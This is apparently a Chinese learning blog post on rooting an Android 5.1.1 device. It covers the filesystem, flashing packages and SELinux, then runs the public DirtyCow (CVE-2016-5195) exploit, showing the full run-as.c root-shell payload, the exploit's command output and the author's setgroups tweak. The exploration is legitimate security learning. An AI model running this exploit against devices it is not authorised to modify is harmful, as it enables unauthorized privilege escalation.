---
title: ROOT安卓设备过程中的一些记录
date: 2019-06-19 00:00:00
categories:
- CTF/Android
tags: root selinux 提权 dirtycow
---

最近在尝试root一个设备，Android 5.1.1，遇到了一系列的问题，内容很杂，在此记录，日后继续完善

## Android设备上信息获取

### 获得android的linux内核版本

```bash
shell@hwHiTV-M1:/ $ cat /proc/version
Linux version 3.18.13_s40 (lwx342800@wuhp000100124) (gcc version 4.9.2 20140904 (prerelease) (gcc-4.9.2 + eglibc-2.19 (Build by czyong) Mon Mar 9 14:14:50 CST 2015) ) #1 SMP Tue Mar 26 17:34:51 HKT 2019
```
### 根据本地端口号寻找对应的用户UID和进程PID

[根据本地端口号寻找对应的用户UID和进程PID](https://blog.csdn.net/u013107656/article/details/74925736)

## linux提权 与 AndroidRoot

Android的内核就是Linux，所以Android获取root其实和Linux获取root权限是一回事儿：获得一个`用户是root`并且`可以执行任意代码`的进程

参考：

- [Android提权原理](https://www.cnblogs.com/goodhacker/p/3993673.html)
- [知乎:Android 的提权 (Root) 原理是什么?](https://www.zhihu.com/question/21074979)

### 区别

但是Android毕竟和linux不同，不同就体现在对于权限功能所提供给用户的接口是不同的。比如二进制程序`su`，再比如用户信息文件`/etc/passwd`：

#### su

- linux中的su需要对密码进行校验，源码分析:[Linux下su命令的实现](https://blog.csdn.net/Learning_zhang/article/details/53349681)
- Android中的su直接切换用户，不需要密码，而且其实大部分android手机里压根没有su这个二进制文件:[android su源码](https://blog.csdn.net/passerbysrs/article/details/46650253)、[Android开发之《制作自己的su文件》](https://www.cnblogs.com/alanfang/p/6951939.html)

虽然有些许不同，但是原理都差不多，都是通过`setuid()`，这个库函数更改当前进程的用户，然后执行shell

> 注：android中的大部分可执行的二进制文件都在`/system/bin`或`/system/xbin`目录下

#### 用户查看

在linux中可以直接查看/etc/passwd获得用户信息,而在Android中压根没有这个文件。Android的uid是在源码中存在映射表的，是写死的[android_filesystem_config.h](https://android.googlesource.com/platform/system/core/+/master/libcutils/include/private/android_filesystem_config.h)，系统用户的pid从0~9999，应用程序pid从10000开始。


### 提权方式

- 内核漏洞（可执行任意命令）
- 带有s位的可执行程序的漏洞
- 利用内核漏洞覆盖带有s位的可执行程序
- 利用环境变量

参考：[实战Linux下三种不同方式的提权技巧](https://blog.csdn.net/nzjdsds/article/details/82874534)

## Android文件系统

android的文件系统是个复杂的问题，通过mount命令不难发现，android的文件系统中不仅存在着很多个从flash芯片上挂载的分区，并且还有很多的存在于内存的文件系统，以下是某个设备的mount情况：从左至右依次是 挂载源 挂载目标 文件系统格式 属性

```bash
shell@hwHiTV-M1:/ $ mount
rootfs / rootfs ro,seclabel,size=785912k,nr_inodes=196478 0 0
tmpfs /dev tmpfs rw,seclabel,nosuid,relatime,size=1020068k,nr_inodes=255017,mode=755 0 0
devpts /dev/pts devpts rw,seclabel,relatime,mode=600 0 0
proc /proc proc rw,relatime 0 0
sysfs /sys sysfs rw,seclabel,relatime 0 0
adb /dev/usb-ffs/adb functionfs rw,relatime 0 0
selinuxfs /sys/fs/selinux selinuxfs rw,relatime 0 0
tmpfs /mnt tmpfs rw,seclabel,relatime,size=1020068k,nr_inodes=255017,mode=775,gid=1000 0 0
tmpfs /log tmpfs rw,seclabel,relatime,size=1020068k,nr_inodes=255017,mode=664,gid=1000 0 0
tmpfs /storage/cifs tmpfs rw,seclabel,relatime,size=1020068k,nr_inodes=255017,mode=775,gid=1000 0 0
tmpfs /mnt/secure tmpfs rw,seclabel,relatime,size=1020068k,nr_inodes=255017,mode=700 0 0
tmpfs /mnt/asec tmpfs rw,seclabel,relatime,size=1020068k,nr_inodes=255017,mode=755,gid=1000 0 0
tmpfs /mnt/obb tmpfs rw,seclabel,relatime,size=1020068k,nr_inodes=255017,mode=755,gid=1000 0 0
/dev/block/platform/soc/by-name/system /system ext4 ro,seclabel,relatime,data=ordered 0 0
/dev/block/platform/soc/by-name/cache /cache ext4 rw,seclabel,nosuid,nodev,relatime,data=ordered 0 0
/dev/block/platform/soc/by-name/userdata /data ext4 rw,seclabel,nosuid,nodev,relatime,data=ordered 0 0
/dev/block/platform/soc/by-name/databackup /databackup ext4 rw,seclabel,nosuid,nodev,relatime,data=ordered 0 0
/dev/block/platform/soc/by-name/cust /cust ext4 ro,seclabel,nosuid,nodev,relatime,data=ordered 0 0
/data/media /mnt/shell/emulated sdcardfs rw,nosuid,nodev,relatime,uid=1023,gid=1028,derive=legacy,reserved=100MB 0 0
```
目前我还不是很懂rootfs，tmpfs，proc这种东西的源怎么形容，但我大概猜测这是一个基于内存的文件系统，因为我知道proc是内存信息，这个和linux一致。

### 根文件系统ramdisk

linux的根文件系统一般就是一个磁盘分区比如：

```bash
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```

再比如我的mac上：

```bash
/dev/disk1s1 on / (apfs, local, journaled)
```

可是android上：

```bash
rootfs / rootfs ro,seclabel,size=785912k,nr_inodes=196478 0 0
```

这里android的根文件系统是一个特殊的东西，叫做ramdisk虚拟内存盘，将ram模拟成硬盘来使用的文件系统。对于传统的磁盘文件系统来说，这样做的好处是可以极大提高文件访问速度；但由于是ram，所以在掉电后，这部分内容不能保存。ramdisk文件系统是在系统上电后直接从磁盘一次性加载到内存，在整个运行期间都不会有写回操作，所以，任何修改都掉电后丢失，ramdisk源于ramdisk.img，ramdisk.img随kernel一起打包在boot.img中。

android的根目录下有一些常用的配置文件：

- init.rc: 存放启动时一些命令
- default.prop: adbroot开关，ro.debuggable开关，都在这

参考：

- [Android 系统的启动过程](https://www.jianshu.com/p/b8ff62832a89)
- [Android ramdisk.img 分析、解压和压缩](https://blog.csdn.net/allon19/article/details/37818905)
- [android各个分区详解](https://blog.csdn.net/liangtianmeng/article/details/83689333)
- [system.img,userdata.img,ramdisk.img,recovery.img,cache.img,boot.img关系解析](https://blog.csdn.net/u013372900/article/details/54862787)

### 刷机包与文件系统

对于手机安装或更换操作系统称之为刷机，那么仿照电脑更好理解，电脑上的存储介质一般有：BIOS固件，磁盘，内存。BIOS固件在我们安装操作系统的时候一般不需要更改，只需要通过BIOS选择引导项，然后将操作系统安装到磁盘上即可，磁盘的分区也是用户操作，清晰可见。但是对于android设备，应该是有boot，flash，ram，sdcard等存储介质。那么究竟有多少个flash芯片存放固件，每个flash芯片上的文件系统是否进行分区？目前我是不懂，但是通过mount命令的结果可以看到：肯定不是像linux桌面版那种就挂一个磁盘到根目录就完事了这么简单。

```bash
/dev/block/platform/soc/by-name/system /system ext4 ro,seclabel,relatime,data=ordered 0 0
/dev/block/platform/soc/by-name/cache /cache ext4 rw,seclabel,nosuid,nodev,relatime,data=ordered 0 0
/dev/block/platform/soc/by-name/userdata /data ext4 rw,seclabel,nosuid,nodev,relatime,data=ordered 0 0
/dev/block/platform/soc/by-name/databackup /databackup ext4 rw,seclabel,nosuid,nodev,relatime,data=ordered 0 0
/dev/block/platform/soc/by-name/cust /cust ext4 ro,seclabel,nosuid,nodev,relatime,data=ordered 0 0
/data/media /mnt/shell/emulated sdcardfs rw,nosuid,nodev,relatime,uid=1023,gid=1028,derive=legacy,reserved=100MB 0 0
```

那就研究一下刷机包的内容

#### 线刷包

以下为小米6官方提供的线刷包内容：

```bash
➜  sagit_images_9.5.30_20190530.0000.00_9.0_cn tree .
.
├── flash_all.bat
├── flash_all.sh
├── flash_all_except_storage.bat
├── flash_all_except_storage.sh
├── flash_all_lock.bat
├── flash_all_lock.sh
├── flash_all_lock_crc.bat
├── flash_gen_crc_list.py
├── flash_gen_md5_list.py
├── flash_gen_resparsecount
├── images
│   ├── BTFM.bin
│   ├── NON-HLOS.bin
│   ├── abl.elf
│   ├── adspso.bin
│   ├── boot.img
│   ├── cache.img
│   ├── cmnlib.mbn
│   ├── cmnlib64.mbn
│   ├── crclist.txt
│   ├── cust.img
│   ├── devcfg.mbn
│   ├── dummy.img
│   ├── elf_path.txt
│   ├── gpt_backup0.bin
│   ├── gpt_backup1.bin
│   ├── gpt_backup2.bin
│   ├── gpt_backup3.bin
│   ├── gpt_backup4.bin
│   ├── gpt_backup5.bin
│   ├── gpt_both0.bin
│   ├── gpt_both1.bin
│   ├── gpt_both2.bin
│   ├── gpt_both3.bin
│   ├── gpt_both4.bin
│   ├── gpt_both5.bin
│   ├── gpt_empty0.bin
│   ├── gpt_empty1.bin
│   ├── gpt_empty2.bin
│   ├── gpt_empty3.bin
│   ├── gpt_empty4.bin
│   ├── gpt_empty5.bin
│   ├── gpt_main0.bin
│   ├── gpt_main1.bin
│   ├── gpt_main2.bin
│   ├── gpt_main3.bin
│   ├── gpt_main4.bin
│   ├── gpt_main5.bin
│   ├── hyp.mbn
│   ├── keymaster.mbn
│   ├── logfs_ufs_8mb.bin
│   ├── logo.img
│   ├── misc.img
│   ├── partition.xml
│   ├── patch0.xml
│   ├── patch1.xml
│   ├── patch2.xml
│   ├── patch3.xml
│   ├── patch4.xml
│   ├── patch5.xml
│   ├── persist.img
│   ├── pmic.elf
│   ├── prog_ufs_firehose_8998_ddr.elf
│   ├── rawprogram0.xml
│   ├── rawprogram1.xml
│   ├── rawprogram2.xml
│   ├── rawprogram3.xml
│   ├── rawprogram4.xml
│   ├── rawprogram5.xml
│   ├── recovery.img
│   ├── rpm.mbn
│   ├── sparsecrclist.txt
│   ├── splash.img
│   ├── storsec.mbn
│   ├── system.img
│   ├── tz.mbn
│   ├── userdata.img
│   └── xbl.elf
├── md5sum.xml
└── misc.txt
```

flash_all.bat的内容

```bat
fastboot %* getvar product 2>&1 | findstr /r /c:"^product: *sagit" || echo Missmatching image and device
fastboot %* getvar product 2>&1 | findstr /r /c:"^product: *sagit" || exit /B 1
set CURRENT_ANTI_VER=1
for /f "tokens=2 delims=: " %%i in ('fastboot %* getvar anti 2^>^&1 ^| findstr /r /c:"anti:"') do (set version=%%i)
if [%version%] EQU [] set version=0
if %version% GTR %CURRENT_ANTI_VER% (
    echo current device antirollback version is greater than this pakcage
    exit /B 1
)
fastboot %* erase boot || @echo "Erase boot error" && exit /B 1
fastboot %* flash crclist %~dp0images\crclist.txt || @echo "Flash crclist error" && exit /B 1
fastboot %* flash sparsecrclist %~dp0images\sparsecrclist.txt || @echo "Flash sparsecrclist error" && exit /B 1
fastboot %* flash xbl %~dp0images\xbl.elf || @echo "Flash xbl error" && exit /B 1
fastboot %* flash xblbak %~dp0images\xbl.elf || @echo "Flash xblbak error" && exit /B 1
fastboot %* flash abl %~dp0images\abl.elf || @echo "Flash abl error" && exit /B 1
fastboot %* flash ablbak %~dp0images\abl.elf || @echo "Flash ablbak error" && exit /B 1
fastboot %* flash tz %~dp0images\tz.mbn || @echo "Flash tz error" && exit /B 1
fastboot %* flash tzbak %~dp0images\tz.mbn || @echo "Flash tzbak error" && exit /B 1
fastboot %* flash hyp %~dp0images\hyp.mbn || @echo "Flash hyp error" && exit /B 1
fastboot %* flash hypbak %~dp0images\hyp.mbn || @echo "Flash hypbak error" && exit /B 1
fastboot %* flash rpm %~dp0images\rpm.mbn || @echo "Flash rpm error" && exit /B 1
fastboot %* flash rpmbak %~dp0images\rpm.mbn || @echo "Flash rpmbak error" && exit /B 1
fastboot %* flash pmic %~dp0images\pmic.elf || @echo "Flash pmic error" && exit /B 1
fastboot %* flash pmicbak %~dp0images\pmic.elf || @echo "Flash pmicbak error" && exit /B 1
fastboot %* flash devcfg %~dp0images\devcfg.mbn || @echo "Flash devcfg error" && exit /B 1
fastboot %* flash storsec %~dp0images\storsec.mbn || @echo "Flash storsec error" && exit /B 1
fastboot %* flash bluetooth %~dp0images\BTFM.bin || @echo "Flash bluetooth error" && exit /B 1
fastboot %* flash cmnlib %~dp0images\cmnlib.mbn || @echo "Flash cmnlib error" && exit /B 1
fastboot %* flash cmnlibbak %~dp0images\cmnlib.mbn || @echo "Flash cmnlibbak error" && exit /B 1
fastboot %* flash cmnlib64 %~dp0images\cmnlib64.mbn || @echo "Flash cmnlib64 error" && exit /B 1
fastboot %* flash cmnlib64bak %~dp0images\cmnlib64.mbn || @echo "Flash cmnlib64bak error" && exit /B 1
fastboot %* flash modem %~dp0images\NON-HLOS.bin || @echo "Flash modem error" && exit /B 1
fastboot %* flash dsp %~dp0images\adspso.bin || @echo "Flash dsp error" && exit /B 1
fastboot %* flash keymaster %~dp0images\keymaster.mbn || @echo "Flash keymaster error" && exit /B 1
fastboot %* flash keymasterbak %~dp0images\keymaster.mbn || @echo "Flash keymasterbak error" && exit /B 1
fastboot %* flash logo %~dp0images\logo.img || @echo "Flash logo error" && exit /B 1
fastboot %* flash splash %~dp0images\splash.img || @echo "Flash splash error" && exit /B 1
fastboot %* flash misc %~dp0images\misc.img || @echo "Flash misc error" && exit /B 1
fastboot %* flash system %~dp0images\system.img || @echo "Flash system error" && exit /B 1
fastboot %* flash cache %~dp0images\cache.img || @echo "Flash cache error" && exit /B 1
fastboot %* flash userdata %~dp0images\userdata.img || @echo "Flash userdata error" && exit /B 1
fastboot %* flash recovery %~dp0images\recovery.img || @echo "Flash recovery error" && exit /B 1
fastboot %* erase sec || @echo "Erase sec error" && exit /B 1
fastboot %* flash cust %~dp0images\cust.img || @echo "Flash cust error" && exit /B 1
fastboot %* flash boot %~dp0images\boot.img || @echo "Flash boot error" && exit /B 1
fastboot %* flash logfs %~dp0images\logfs_ufs_8mb.bin || @echo "Flash logfs error" && exit /B 1
fastboot %* reboot || @echo "Reboot error" && exit /B 1
```

大概的意思就是通过`fastboot  flash  分区  分区镜像.img`这种命令对芯片的不同分区进行烧录，那么flash芯片里到底有多少分区？这些分区是在什么时候被划分的？有什么工具可以对flash芯片进行划分？还是这条命令自己就分区了？暂时我还不得而知。

#### 卡刷包

以下为网上找的一个cm13的卡刷包内容，看起来更像是一个完整的文件系统了。

```
➜  cm-13.0-20160415-XXOS-bacon tree -N -L 2 --sort=name
.
├── META-INF
│   ├── CERT.RSA
│   ├── CERT.SF
│   ├── MANIFEST.MF
│   ├── com
│   └── org
├── boot.img
├── file_contexts
├── install
│   └── bin
├── recovery
│   ├── bin
│   └── recovery-from-boot.p
└── system
    ├── addon.d
    ├── app
    ├── bin
    ├── build.prop
    ├── etc
    ├── fonts
    ├── framework
    ├── lib
    ├── media
    ├── priv-app
    ├── recovery-from-boot.p
    ├── supersu
    ├── tts
    ├── usr
    ├── vendor
    └── xbin

```
通过recovery卡刷完之后，这些文件究竟会被放到哪里，现在我还不得而知。

## selinux与seAndroid

为了应对root权限大过天的这种现象，selinux应运而生，简单的说就是不仅利用rwx这种权限位对文件进行限制，selinux中对于所有资源：文件，网络，进程，都附加了一个属性context，每个进程也有相应的context，只有进程的context允许访问资源的context，这个请求才可以被允许。也就是说即使你现在是root用户，但是你的context级别太低，一样啥也干不了。


查看文件和进程的context只要加`-Z`参数即可：`u:r:init:s0 `和`u:object_r:rootfs:s0 acct`就是context，也其实就是个字符串

```bash
shell@hwHiTV-M1:/ $ ps -Z
LABEL                          USER     PID   PPID  NAME
u:r:init:s0                    root      1     0     /init
u:r:kernel:s0                  root      2     0     kthreadd
u:r:kernel:s0                  root      3     2     ksoftirqd/0
u:r:kernel:s0                  root      5     2     kworker/0:0H
u:r:kernel:s0                  root      7     2     rcu_sched
u:r:kernel:s0                  root      8     2     rcu_bh
u:r:kernel:s0                  root      9     2     migration/0
u:r:kernel:s0                  root      10    2     migration/1

shell@hwHiTV-M1:/ $ ls -Z
drwxr-xr-x root     root              u:object_r:rootfs:s0 acct
drwxrwx--- system   cache             u:object_r:cache_file:s0 cache
lrwxrwxrwx root     root              u:object_r:rootfs:s0 charger -> /sbin/healthd
dr-x------ root     root              u:object_r:rootfs:s0 config
drwxr-xr-x root     root              u:object_r:cust_file:s0 cust
lrwxrwxrwx root     root              u:object_r:rootfs:s0 d -> /sys/kernel/debug
drwxrwx--x system   system            u:object_r:system_data_file:s0 data
drwxr-xr-x root     root              u:object_r:databackup_file:s0 databackup
```

参考:

- [一文彻底明白linux中的selinux到底是什么](https://blog.csdn.net/yanjun821126/article/details/80828908)
- [详解 SEAndroid 以及 Hack 其规则（sepolicy）](https://www.jianshu.com/p/5faffa9d9061)
- [android sepolicy 最新小结](https://blog.csdn.net/ch853199769/article/details/82498725)
- [Android系统上SELinux的攻与防](https://blog.csdn.net/xinlangren88/article/details/79557476)


### Android中selinux的控制

Android 4.4首次引入了selinux，Android 5.0 默认开启强制模式



可以通过`getenforce`命令获得当前selinux是否开启的状态：

- Enforcing为强制模式，违反规则的行为会被拒绝并记录
- Permissive，违反规则的行为会被记录，并不拒绝
- Disabled，关闭

可以通过`setenforce 0`关闭selinux，当然你不一定有权限

### sepolicy文件

sepolicy文件就是控制访问规则的文件，可惜规则并不是以字符形式存在于这个文件中，这个文件是由规则源文件（后缀名是te）编译得到的，这文件存手机哪了？我目前的设备好像在根目录下就有这个文件

```bash
shell@hwHiTV-M1:/ $ pwd
/
shell@hwHiTV-M1:/ $ ls -l | grep sepolicy                                      
-rw-r--r-- root     root       175212 1970-01-01 08:00 sepolicy
shell@hwHiTV-M1:/ $ ls -Z | grep sep                                           
-rw-r--r-- root     root              u:object_r:rootfs:s0 sepolicy
```
可以通过[setools-android](https://github.com/xmikos/setools-android)这个工具修改sepolicy文件，这个工具是利用ndk-build，编译完成后push进手机，在手机的shell里使用这个工具即可。不过想通过修改根目录下这个文件应该并没卵用，应用于selinux的规则应该在存在于内存中，如果修改了内存中的规则文件，则绕过成功。那内存中的规则文件在哪呢？通过mount发现一条信息：

```bash
selinuxfs /sys/fs/selinux selinuxfs rw,relatime 0 0
```
也就是说应该是有一个`selinuxfs`文件系统，挂载到`/sys/fs/selinux`目录下了去看一下：

```bash
shell@hwHiTV-M1:/ $ ls -l /sys/fs/selinux
-rw-rw-rw- root     root            0 1970-01-01 08:00 access
dr-xr-xr-x root     root              1970-01-01 08:00 avc
dr-xr-xr-x root     root              1970-01-01 08:00 booleans
-rw-r--r-- root     root            0 1970-01-01 08:00 checkreqprot
dr-xr-xr-x root     root              1970-01-01 08:00 class
--w------- root     root            0 1970-01-01 08:00 commit_pending_bools
-rw-rw-rw- root     root            0 1970-01-01 08:00 context
-rw-rw-rw- root     root            0 1970-01-01 08:00 create
-r--r--r-- root     root            0 1970-01-01 08:00 deny_unknown
--w------- root     root            0 1970-01-01 08:00 disable
-rw-r--r-- root     root            0 2019-06-18 15:58 enforce
dr-xr-xr-x root     root              1970-01-01 08:00 initial_contexts
-rw------- root     root            0 1970-01-01 08:00 load
-rw-rw-rw- root     root            0 1970-01-01 08:00 member
-r--r--r-- root     root            0 1970-01-01 08:00 mls
crw-rw-rw- root     root       1,   3 1970-01-01 08:00 null
-r--r--r-- root     root       175212 1970-01-01 08:00 policy
dr-xr-xr-x root     root              1970-01-01 08:00 policy_capabilities
-r--r--r-- root     root            0 1970-01-01 08:00 policyvers
-r--r--r-- root     root            0 1970-01-01 08:00 reject_unknown
-rw-rw-rw- root     root            0 1970-01-01 08:00 relabel
-r--r--r-- root     root            0 1970-01-01 08:00 status
-rw-rw-rw- root     root            0 1970-01-01 08:00 user
```

应该就是这玩意了，这`policy`文件和根目录下的`sepolicy`大小相同，应该就是他了，但是我甚至都无法读取这个文件，不知为何。找到一篇bypass selinux的文章，就是覆盖这个目录下的enforce文件，使其从1变成0，但是我都读不出来enforce的内容...文章链接：[Bypass SELinux on Android](https://shunix.com/bypass-selinux-on-android/)

## DirtyCow root android

网上能找到的好多文章都是利用DirtyCow写个root用户的文件就完事了，如：[DirtyCow（脏牛）漏洞复现](https://blog.csdn.net/wanzt123/article/details/81879680)

利用DirtyCow进行完整的androidroot的文章并不多，找到了如下工具以及文章：

- [搞了一个基于 dirtycow 的 Android 的 root 工具](https://www.v2ex.com/t/335989)
- [timwr/CVE-2016-5195](https://github.com/timwr/CVE-2016-5195)

第一个是64位的，据说可以bypass selinux，第二个可用但是无法绕过selinux，主要使用第二个工具进行了一系列的测试，使用方法：

- adb devices 确认设备已连接
- 在exp目录下执行make root，按照makefile的内容会自动弹出一个来自设备的root shell
- 但是并不弹出，执行一会可以另开一个终端进入adb shell，然后执行run-as，即可得到一个root的shell

```bash
➜  CVE-2016-5195 make root
ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=armeabi-v7a APP_PLATFORM=android-22
make[1]: Entering directory `/Users/wangyuxuan/Desktop/pwn/dirtycow/CVE-2016-5195-47461529aa629433fea956b44dab487d4486b629'
[armeabi-v7a] Install        : dirtycow => libs/armeabi-v7a/dirtycow
[armeabi-v7a] Compile thumb  : run-as <= run-as.c
[armeabi-v7a] Executable     : run-as
[armeabi-v7a] Install        : run-as => libs/armeabi-v7a/run-as
make[1]: Leaving directory `/Users/wangyuxuan/Desktop/pwn/dirtycow/CVE-2016-5195-47461529aa629433fea956b44dab487d4486b629'
adb push libs/armeabi-v7a/dirtycow /data/local/tmp/dcow
libs/armeabi-v7a/dirtycow: 1 file pushed. 0.1 MB/s (9844 bytes in 0.108s)
adb shell 'chmod 777 /data/local/tmp/dcow'
adb shell 'chmod 777 /data/local/tmp/dcow'
adb push libs/armeabi-v7a/run-as /data/local/tmp/run-as
libs/armeabi-v7a/run-as: 1 file pushed. 0.1 MB/s (9844 bytes in 0.124s)
adb shell '/data/local/tmp/dcow /data/local/tmp/run-as /system/bin/run-as'
WARNING: linker: /data/local/tmp/dcow: unused DT entry: type 0x6ffffffe arg 0x828
WARNING: linker: /data/local/tmp/dcow: unused DT entry: type 0x6fffffff arg 0x2
dcow /data/local/tmp/run-as /system/bin/run-as
warning: new file size (9844) and destination file size (9436) differ

corruption?

[*] size 9844
[*] mmap 0x76efc000
[*] currently 0x76efc000=464c457f
[*] using /proc/self/mem method
[*] madvise = 0x76efc000 9844
[*] madvise = 0 16777216
[*] /proc/self/mem -781978392 356866
[*] exploited 0 0x76efc000=464c457f

➜  CVE-2016-5195 adb shell
shell@hwHiTV-M1:/ $ run-as
WARNING: linker: run-as: unused DT entry: type 0x6ffffffe arg 0x9fc
WARNING: linker: run-as: unused DT entry: type 0x6fffffff arg 0x2
uid run-as 2000
uid 0
0 u:r:runas:s0
0
context 0 u:r:shell:s0
shell@hwHiTV-M1:/ # id
uid=0(root) gid=0(root) groups=1003(graphics),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) context=u:r:shell:s0
shell@hwHiTV-M1:/ # ls /data
/system/bin/sh: ls: /data: Permission denied

```

### 原理

就是利用的DirtyCow漏洞的任意写文件，覆盖`/system/bin/`目录下run-as文件，这个文件是root所有且拥有s权限位的，即普通用户运行时，进程权限为root，如果此二进制文件的代码被修改，即可以root用户执行任意代码。

参考：[Android中的run-as命令引出升降权限的安全问题](https://blog.csdn.net/qq_35559358/article/details/79052640)


run-as.c

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <dlfcn.h>
#include <fcntl.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#elif PRINT
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif

//reduce binary size
char __aeabi_unwind_cpp_pr0[0];

typedef int getcon_t(char ** con);
typedef int setcon_t(const char* con);

extern int dcow(int argc, const char *argv[]);

int main(int argc, const char **argv)
{
	LOGV("uid %s %d", argv[0], getuid());

	if (setresgid(0, 0, 0) || setresuid(0, 0, 0)) {
		LOGV("setresgid/setresuid failed");
	}

	LOGV("uid %d", getuid());

	dlerror();
#ifdef __aarch64__
	void * selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
	void * selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
	if (selinux) {
		void * getcon = dlsym(selinux, "getcon");
		const char *error = dlerror();
		if (error) {
			LOGV("dlsym error %s", error);
		} else {
			getcon_t * getcon_p = (getcon_t*)getcon;
			char * secontext;
			int ret = (*getcon_p)(&secontext);
			LOGV("%d %s", ret, secontext);
			void * setcon = dlsym(selinux, "setcon");
			const char *error = dlerror();
			if (error) {
				LOGV("dlsym setcon error %s", error);
			} else {
				setcon_t * setcon_p = (setcon_t*)setcon;
				ret = (*setcon_p)("u:r:shell:s0");
				ret = (*getcon_p)(&secontext);
				LOGV("context %d %s", ret, secontext);
			}
		}
		dlclose(selinux);
	} else {
		LOGV("no selinux?");
	}

	system("/system/bin/sh -i");

}
```

可见也是通过`setresgid(),setresuid()`这种利用库函数设置当前进程uid的方法进行提权，与上文提到的su中的`setuid()`代码实现类似，并且设置了进程上下文为`u:r:shell:s0`，尝试改成`u:r:init:s0`和`u:r:kernel:s0`均失败

### 修改payload

通过上述方法获得shell因为selinux还是基本啥都干不了，连个/data/目录都看不了，我在main函数里加了两行：

```C
int a[4] = {0,1,1000,2000};
setgroups(4,a);
```
通过setgroups可以是用户加入更多的组，现在的效果如下：

```bash
shell@hwHiTV-M1:/ $ run-as
WARNING: linker: run-as: unused DT entry: type 0x6ffffffe arg 0xa1c
WARNING: linker: run-as: unused DT entry: type 0x6fffffff arg 0x2
uid run-as 2000
uid 0
0 u:r:runas:s0
0
context 0 u:r:shell:s0
shell@hwHiTV-M1:/ # id
uid=0(root) gid=0(root) groups=0(root),1,1000(system),2000(shell) context=u:r:shell:s0
shell@hwHiTV-M1:/ # ls /data
android_logs
anr
app
app-asec
app-lib
app-private
```

至少能看data了，想干点别的，多加进用户组呗，想不出其他的方法了。

### 讨论

关于利用脏牛漏洞root安卓设备怎么绕过selinux在这个github项目上也有很多讨论：

- [SEAndroid on some of the issues](https://github.com/timwr/CVE-2016-5195/issues/54)
- [How do you spawn a shell after exploit?](https://github.com/timwr/CVE-2016-5195/issues/9)

### system分区到底怎么回事

貌似没有什么好的解决方案，有人想通过注入恶意代码到.so，然后等着设备重启，一个用户是root，context是init或者kernel的进程加载此.so文件，完成root。此方法行不行的通另当别论，但是android的动态链接库基本都在/system/lib目录下，system这个分区在mount下可以看到是ro，只读的分区。如果不remount，按道理这个分区我不可能进行修改。

```bash
shell@hwHiTV-M1:/system/lib $ mount | grep system                          
/dev/block/platform/soc/by-name/system /system ext4 ro,seclabel,relatime,data=ordered 0 0
shell@hwHiTV-M1:/system/lib $ ls -al /dev/block/platform/soc/by-name/system
lrwxrwxrwx root     root              1970-01-01 08:00 system -> /dev/block/mmcblk0p15
shell@hwHiTV-M1:/system/lib $ ls -al /dev/block/mmcblk0p15
brw------- root     root     259,   7 1970-01-01 08:00 mmcblk0p15
```
这个分区是通过一个块设备挂载到system目录下，和根目录这种仅仅存在于内存中的不同，如果我对这个文件系统里的内容进行修改，那么应该会被写回到块设备中的。刚才我们通过dirtycow覆盖了一个run-as文件，此文件存在于：`/system/bin`目录下，但是让我重启后，run-as又变回了系统原来的run-as，为啥为啥为啥，一脸懵逼。

## 修改运行时selinux

- [Android Native病毒——2018年度研究报告](https://zhuanlan.zhihu.com/p/54553148)

文章中提到的run-as家族病毒看起来绕过selinux很轻松，问一个老师，老师说这个报告都是老黄历了...


- [“地狱火”手机病毒——源自安卓系统底层的威胁](http://blogs.360.cn/post/analysis_of_diyuhuo.html)

这个病毒通过修改boot分区中的Sepolicy然后在写回达到绕过selinux的方法，没尝试，但我猜不好使，如果这么就绕过去了岂不是太简单了...而且又是分区，android的分区和运行时内存，到底什么关联？头疼

## root结论

目前新设备大部分root都是通过修改刷机包中的配置文件开启root和关闭selinux，直接通过一个漏洞不用刷机不用重启，获得一个root的没有selinux限制的shell，见都没见过...